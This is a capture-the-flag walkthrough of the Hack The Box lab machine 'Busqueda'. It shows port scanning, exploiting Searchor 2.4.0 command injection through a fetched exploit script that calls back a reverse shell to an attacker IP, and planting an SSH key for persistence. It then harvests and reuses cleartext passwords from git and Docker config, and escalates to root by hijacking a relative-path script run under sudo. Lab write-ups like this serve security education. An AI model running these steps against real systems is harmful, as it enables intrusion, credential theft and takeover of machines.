# Busqueda - Easy

```sh
sudo vim /etc/hosts
# map busqueda.htb

nmap -T4 -p- -A -Pn -v busqueda.htb
```

* Open ports & services:

    * 22/tcp - ssh - OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
    * 80/tcp - http - Apache httpd 2.4.52

* Trying to navigate to <http://busqueda.htb> leads us to another domain <http://searcher.htb>, so we have to add this in our hosts file too:

    ```sh
    sudo vim /etc/hosts
    # map searcher.htb
    ```

* This leads us to the page for 'Searcher', a collection of search engines - we have an input box for our query; the footer mentions [Searchor](https://github.com/ArjunSharda/Searchor) 2.4.0, the app on which it is based

* Googling for exploits related to Searchor 2.4.0 leads us to [exploit for arbitrary command injection](https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection) - this takes advantage of an ```eval()``` function, which can be used for code execution:

    ```sh
    wget https://raw.githubusercontent.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection/refs/heads/main/exploit.sh -O searchor-2.4.0-exploit.sh
    # fetch the exploit script

    chmod +x searchor-2.4.0-exploit.sh

    nc -nvlp 4444
    # setup listener

    ./searchor-2.4.0-exploit.sh http://searcher.htb 10.10.14.33 4444
    # gives reverse shell
    ```

* We get the reverse shell after running the exploit:

    ```sh
    id
    # svc

    ls -la /home
    # only one user

    cd
    
    ls -la
    # get user flag

    # for persistent SSH session

    mkdir .ssh

    cd .ssh

    # in attacker machine
    ssh-keygen -f svc
    # generate keys without passphrase

    chmod 600 svc

    cat svc.pub
    # copy pub key contents

    # in reverse shell
    echo "ssh-ed..." > authorized_keys
    # paste the pub key contents

    chmod 600 authorized_keys

    # now we can SSH into this without passphrase
    ssh -i svc svc@busqueda.htb
    ```

* We can start with basic enumeration:

    ```sh
    sudo -l
    # this needs password, we do not have it

    ls -la /home
    
    ls -la /var/www
    # check web directory

    ls -la /var/www/app
    # we have a lot of files here
    ```

* Going through the files in the webapp directory, we have a config file at ```/var/www/app/.git/config``` - this includes a cleartext password 'jh1usoih2bkjaspwe92' for user 'cody', it also mentions the domain 'gitea.searcher.htb', so we can add it in ```/etc/hosts```

* When we visit this domain, we can use the above creds to login, but we only have one project to explore - and that is the searcher site itself; other than that the recent activity mentions 'administrator' user

* We can check for password re-use for 'svc' user, and it works:

    ```sh
    sudo -l
    # use found password
    # it works

    # our user can run the following as root
    # (root) /usr/bin/python3 /opt/scripts/system-checkup.py *

    cat /opt/scripts/system-checkup.py
    # permission denied

    # we can try running the command itself once
    sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
    ```

* On running the Python script as root, we are given 3 possible actions, and we can pass 2 arguments:

    * docker-ps - list running Docker containers
    * docker-inspect - inspect certain Docker container
    * full-checkup - run full system checkup

    ```sh
    sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
    # lists containers
    # we have 'gitea' and 'mysql_db'

    sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect
    # needs 2 arguments - format and container_name

    sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
    # we get an error message 'something went wrong'

    # for the docker-inspect command, we need the arguments according to the actual 'docker inspect' command
    # checked from docker docs

    sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect --format='{{json .Config}}' gitea
    # this prints out complete output in json, but it is cluttered

    sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect --format='{{json .Config}}' mysql_db
    
    # copy the output and parse it using jq
    # remove the initial '--format' so that the content is in JSON format, otherwise we cannot parse it
    echo -n "<output from previous command>" | jq .
    ```

* After reading the 'docker-inspect' outputs for both containers, we have a couple of cleartext creds 'gitea:yuiu1hoiu4i5ho1uh' and 'gitea:jI86kGUuj87guWr3RyF' for Gitea & mySQL database, respectively

* We can try reusing these creds for 'root' user but it does not work; we can also check it on the Gitea server at <http://gitea.searcher.htb>

* We are able to reuse one of the above passwords for the user 'administrator' found earlier on the Gitea server - we have one more project 'scripts' to check now

* This project includes all the scripts from ```/opt/scripts``` that we were not able to read earlier as 'svc' - we can check these scripts, especially 'system-checkup.py' which can be run as root:

    ```py
    #!/bin/bash
    import subprocess
    import sys

    actions = ['full-checkup', 'docker-ps','docker-inspect']

    def run_command(arg_list):
        r = subprocess.run(arg_list, capture_output=True)
        if r.stderr:
            output = r.stderr.decode()
        else:
            output = r.stdout.decode()

        return output


    def process_action(action):
        if action == 'docker-inspect':
            try:
                _format = sys.argv[2]
                if len(_format) == 0:
                    print(f"Format can't be empty")
                    exit(1)
                container = sys.argv[3]
                arg_list = ['docker', 'inspect', '--format', _format, container]
                print(run_command(arg_list)) 
            
            except IndexError:
                print(f"Usage: {sys.argv[0]} docker-inspect <format> <container_name>")
                exit(1)
        
            except Exception as e:
                print('Something went wrong')
                exit(1)
        
        elif action == 'docker-ps':
            try:
                arg_list = ['docker', 'ps']
                print(run_command(arg_list)) 
            
            except:
                print('Something went wrong')
                exit(1)

        elif action == 'full-checkup':
            try:
                arg_list = ['./full-checkup.sh']
                print(run_command(arg_list))
                print('[+] Done!')
            except:
                print('Something went wrong')
                exit(1)
                

    if __name__ == '__main__':

        try:
            action = sys.argv[1]
            if action in actions:
                process_action(action)
            else:
                raise IndexError

        except IndexError:
            print(f'Usage: {sys.argv[0]} <action> (arg1) (arg2)')
            print('')
            print('     docker-ps     : List running docker containers')
            print('     docker-inspect : Inpect a certain docker container')
            print('     full-checkup  : Run a full system checkup')
            print('')
            exit(1)
    ```

* For the 'full-checkup' command, we can see it mentions the script ```./full-checkup.sh``` in the argument list - here it does not go for the complete path of the script, so we can abuse this

* As the code mentions ```./full-checkup.sh``` (instead of full path), we can run this script as root from any directory with a malicious 'full-checkup.sh', and that will be executed:

    ```sh
    cd /tmp

    vim full-checkup.sh
    # malicious script to print root flag
    # we can write reverse-shell one-liner as well but not needed

    chmod +x full-checkup.sh

    # now we can run the sudo command
    sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
    # this prints the root flag
    ```

    ```sh
    #!/bin/bash
    cat /root/root.txt
    ```
